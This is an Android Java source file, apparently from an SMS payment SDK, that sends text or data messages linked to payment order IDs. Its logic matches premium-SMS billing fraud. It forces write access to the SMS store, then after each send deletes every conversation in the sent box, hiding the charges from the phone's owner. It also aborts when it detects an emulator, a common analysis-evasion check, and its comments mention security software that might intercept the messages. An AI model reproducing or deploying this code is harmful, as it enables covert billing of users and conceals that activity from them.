package com.example.sayid.myapplication.sms;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.example.sayid.myapplication.common.data.ErrorCode;
import com.example.sayid.myapplication.common.listener.OnActionListener;
import com.example.sayid.myapplication.common.listener.SendSmsListener;
import com.example.sayid.myapplication.common.thread.TimeJudge;
import com.example.sayid.myapplication.common.util.MtkDoubleSimUtil;
import com.example.sayid.myapplication.common.util.SmsWriteOpUtil;
import com.example.sayid.myapplication.common.util.TelephonyUtil;
import com.example.sayid.myapplication.smsutil.SmSserver;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;

public class SendSms {
    private final static String TAG = "SendSms";

    /**
     * 发送短信是否成功的广播
     */
    private final static String SEND_SMS_ACTION = "SEND_SMS_ACTION";
    /**
     * 接收者是否成功接收到短信的广播
     */
    private final static String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";

    /**
     * 发送短信类型：普通短信
     */
    public final static String TYPE_NORMA = "0";
    /**
     * 发送短信类型：数据短信
     */
    public final static String TYPE_DATA = "1";

    public final static int ITEMS = 1;

    private Context context;
    private SendSmsListener sendSmsListener;

    private String pay_order_id = "";
    private String user_order_id = "";
    private String type;
    private String destPhone;
    private short destPort;
    /**
     * 数据短信字符编码名称
     */
    private String charsetName;
    private String message;
    private int send_sms_timeout;
//	private boolean isRoot;

    /**
     * 构造函数
     *
     * @param context
     * @param sendSmsListener
     */
    public SendSms(Context context, SendSmsListener sendSmsListener) {
        this.context = context;
        this.sendSmsListener = sendSmsListener;

        //isRoot = CmdUtil.getInstance().isRoot();         //手机是否有ROOT权限
//		isRoot = ShellUtils.checkRootPermission();  
        // 注册广播 发送消息
        try {
            this.context.registerReceiver(sendMessage, new IntentFilter(SEND_SMS_ACTION));
            this.context.registerReceiver(receiver, new IntentFilter(DELIVERED_SMS_ACTION));
        } catch (Exception e) {
//			Logs.e(TAG, "SendSms error:" + e.toString());
            if (sendSmsListener != null) {
                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, "", "", ITEMS, ErrorCode.CODE_114001);
                sendSmsListener = null;
            }
        }
    }

    /**
     * 发送普通短信
     *
     * @param user_order_id
     * @param pay_order_id
     * @param destPhone
     * @param message
     * @param send_sms_timeout
     */
    public void sendSms(String user_order_id, String pay_order_id, String destPhone, String message, int send_sms_timeout) {
        sendSms(user_order_id, pay_order_id, TYPE_NORMA, destPhone, (short) 0, null, message, send_sms_timeout);
    }

    /**
     * 发送短信
     *
     * @param user_order_id
     * @param pay_order_id
     * @param destPhone
     * @param message
     */
    public void sendSms(String user_order_id, String pay_order_id, String type, String destPhone, short destPort, String charsetName, String message, int send_sms_timeout) {
        this.user_order_id = user_order_id;
        this.pay_order_id = pay_order_id;
        this.type = type;
        this.destPhone = destPhone;
        this.destPort = destPort;
        this.charsetName = charsetName;
        this.message = message;
        this.send_sms_timeout = send_sms_timeout;

        send();
    }

    /**
     * 往指定的号码发送短信
     *
     * @param
     * @param
     */
    private void send() {
//		Logs.d(TAG, "-短信发送超时时间--------- Send_Sms_Timeout = " + send_sms_timeout);
//		Logs.d(TAG, "-往指定的号码发送短信--------- Phone=" + destPhone + " Message=" + message);

        try {
            if (TextUtils.isEmpty(destPhone) || TextUtils.isEmpty(message)) {
                if (sendSmsListener != null) {
                    sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114000);
                    sendSmsListener = null;
                }
                return;
            }

//			Logs.e(TAG, "Build.VERSION.SDK_INT===============" + Build.VERSION.SDK_INT);
            try {
//		    	if (!SmsWriteOpUtil.isWriteEnabled(context)) {
                SmsWriteOpUtil.setWriteEnabled(context, true);
//				}
            } catch (Exception e) {
//		    	Logs.e(TAG, e, "setWriteEnabled===============error");
            }

            Intent sentIntent = new Intent(SEND_SMS_ACTION);
            PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, PendingIntent.FLAG_UPDATE_CURRENT);

            Intent deliverIntent = new Intent(DELIVERED_SMS_ACTION);
            PendingIntent deliverPI = PendingIntent.getBroadcast(context, 0, deliverIntent, PendingIntent.FLAG_UPDATE_CURRENT);

            //判断是否为双卡双待机
            if (MtkDoubleSimUtil.isGemini(context)) {
                //双卡双待手机发短信
                MtkDoubleSimUtil.sendDoubleCardMsg(context, TelephonyUtil.getImsi(context), type, destPhone, destPort, charsetName, message, sentPI, deliverPI);
            } else {
                //普通发送，即非双卡双待手机发送短信
                sendSms(sentPI, deliverPI);
            }
        } catch (Exception e) {
            if (sendSmsListener != null) {
                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114013);
                sendSmsListener = null;
            }
        }
    }


    /**
     * 发送，即非双卡双待手机发送短信
     *
     * @param sentPI
     * @param deliverPI
     */
    private void sendSms(PendingIntent sentPI, PendingIntent deliverPI) {
        try {

            SmsManager smsManager = SmsManager.getDefault();
            if (type.equals(SendSms.TYPE_DATA)) {
                try {
                    smsManager.sendDataMessage(destPhone, null, destPort, message.getBytes(charsetName), sentPI, deliverPI);
                } catch (UnsupportedEncodingException e) {
                    smsManager.sendDataMessage(destPhone, null, destPort, message.getBytes(), sentPI, deliverPI);
                }
            } else {
                ArrayList<String> msgs = smsManager.divideMessage(message);
                ArrayList<PendingIntent> sentIntent = new ArrayList<PendingIntent>();
                if (message.length() > 70) {
                    // sendMultipartTextMessage()方法发送超长短信，这种方式还是发送多条短信，但用户收到的短信会是连在一起的一整条

                    for (int i = 0; i < msgs.size(); i++) {
                        PendingIntent pd = PendingIntent.getBroadcast(context, i, new Intent(SmSserver.SendState), 0);
                        sentIntent.add(pd);
                    }
                    smsManager.sendMultipartTextMessage(destPhone, null, msgs, sentIntent, null);
                } else {
                    for (int i = 0; i < msgs.size(); i++) {
                        PendingIntent pd = PendingIntent.getBroadcast(context, i, new Intent(SmSserver.SendState), 0);
                        sentIntent.add(pd);
                    }
                    smsManager.sendMultipartTextMessage(destPhone, null, msgs, sentIntent, null);
                }
            }

            // 短信发送超时，无论有没有Root权限，安全软件
            if (send_sms_timeout > 0) {
                TimeJudge timeJudge = new TimeJudge(send_sms_timeout * 1000, new OnActionListener() {
                    public void onActionFinished(int actionCode, int resultCode, Object data) {

                        if (sendSmsListener != null) {
                            sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114002);
                            sendSmsListener = null;
                        }
                    }
                }, 0);
                // 设置计时器
                timeJudge.start();
            }
        } catch (Exception e) {
//			Logs.e(TAG, "SendS:005" + e.toString());

            if (sendSmsListener != null) {
                sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114013);
                sendSmsListener = null;
            }
        }
    }

    public void deleteSMS(Context context, String smscontent) {
        try {
            // 准备系统短信收信箱的uri地址  
            Uri uri = Uri.parse("content://sms/sent");// 已发件信箱  
            // 查询已发件箱里10条已读短信
            Cursor isRead = context.getContentResolver().query(uri, null, "read=1", null, "date desc limit 10");
            while (isRead.moveToNext()) {
                // String phone = isRead.getString(isRead.getColumnIndex("address")).trim();//获取发信人
                String body = isRead.getString(isRead.getColumnIndex("body")).trim();// 获取信息内容
                if (body.equals(smscontent)) {
                    int id = isRead.getInt(isRead.getColumnIndex("_id"));
                    context.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + id, null);
                }
            }
        } catch (Exception e) {
//			Logs.e(TAG, e, "deleteSMS error:");
        }
    }


    public void deleteSms(Context context) {
        try {
            ContentResolver CR = context.getContentResolver();
            // Query SMS
            Uri uriSms = Uri.parse("content://sms/sent");

            Cursor c = CR.query(uriSms, new String[]{"_id", "thread_id"},
                    null, null, null);

            if (null != c && c.moveToFirst()) {
                do {
                    // Delete SMS
                    long threadId = c.getLong(1);
                    int count = CR.delete(Uri.parse("content://sms/conversations/" + threadId), null, null);
                    //	Log.d(TAG, "threadId:: " + threadId + "  count::  " + String.valueOf(count));

                } while (c.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
            //	Log.d("deleteSMS", "Exception:: " + e);
        }
    }


    private BroadcastReceiver sendMessage = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            // 4.4 删除发送短信
//			if (19 == Build.VERSION.SDK_INT) {
            //	deleteSMS(context, message);
            deleteSms(context);
//			}

            //判断是否使用模拟器发充值短信
            if (TelephonyUtil.isEmulator(context)) {
                if (sendSmsListener != null) {
                    sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114004);
                    sendSmsListener = null;
                }
                return;
            }

            //判断短信是否发送成功
            switch (getResultCode()) {
                case Activity.RESULT_OK:
//					Logs.d(TAG, "sendSmsListener::  RESULT_OK");
                    //有安全软件拦截时，以对方收到短信为基准   等待15秒
//					if(!isRoot || send_sms_timeout == 0){    //当前手机没有开发Root权限，安全软件没有Root权限不能监控到短信的发送
                    //短信发送成功
                    if (sendSmsListener != null) {
                        sendSmsListener.onSendSmsSuccess(user_order_id, pay_order_id, destPhone, message, ITEMS);
                        sendSmsListener = null;
                    }
//					}
                    break;
                default:
                    //短信发送失败
//					Logs.d(TAG, "sendSmsListener : RESULT_Failed");
                    if (sendSmsListener != null) {
                        sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114003);
//						sendSmsListener.onSendSmsSuccess(user_order_id, pay_order_id, destPhone, message, ITEMS);
                        sendSmsListener = null;
                    }
                    break;
            }

            try {
                context.unregisterReceiver(this);
            } catch (Exception e) {
//				Logs.e(TAG, "send unregisterReceiver error:" + e.toString());
            }
        }
    };

    private BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            // 4.4 删除发送短信
//			if (19 == Build.VERSION.SDK_INT) {
            //deleteSMS(context, message);
            deleteSms(context);
//			}

            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    //	Logs.d(TAG, "onReceive : RESULT_OK ");

                    //对方接收短信成功
                    if (sendSmsListener != null) {
                        sendSmsListener.onSendSmsSuccess(user_order_id, pay_order_id, destPhone, message, ITEMS);
                        sendSmsListener = null;
                    }
                    break;
                default:
                    // 对方接收短信失败
//					Logs.d(TAG, "onReceive : RESULT_Failed");
                    if (sendSmsListener != null) {
                        sendSmsListener.onSendSmsFailed(user_order_id, pay_order_id, destPhone, message, ITEMS, ErrorCode.CODE_114005);
                        sendSmsListener = null;
                    }
                    break;
            }

            try {
                context.unregisterReceiver(this);
            } catch (Exception e) {
//				Logs.e(TAG, "receiver unregisterReceiver error:" + e.toString());
            }
        }
    };

}
